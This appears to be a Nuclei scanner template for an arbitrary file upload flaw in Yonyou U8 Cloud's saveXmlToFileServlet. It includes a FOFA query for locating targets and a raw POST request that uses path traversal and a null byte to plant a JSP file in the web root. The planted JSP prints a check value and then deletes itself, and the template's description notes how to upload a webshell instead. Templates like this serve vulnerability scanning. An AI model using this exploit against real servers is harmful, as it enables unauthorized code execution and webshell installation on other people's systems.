id: yonyou-u8c-fileservlet-fileupload

info:
  name: 用友-U8C-FileServlet-文件上传
  author: Abbbbb
  severity: critical
  description: 上传webshell需要进行url编码
  metadata:
    fofa-query: app="用友-U8-Cloud" || body="/api/uclient/public/"
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"

http:
  - raw:
      - |-
        POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\..\..\webapps\nc_web\{{file_name}}%00 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Length: 10
        Content-Type: application/octet-stream
        Accept-Encoding: gzip, deflate, br
        Connection: close

        {{url_encode("<%out.print(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>")}}

      - |+
        GET /{{file_name}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1==200'
          - 'status_code_2==200 && contains(body_2, "12321")'
        condition: and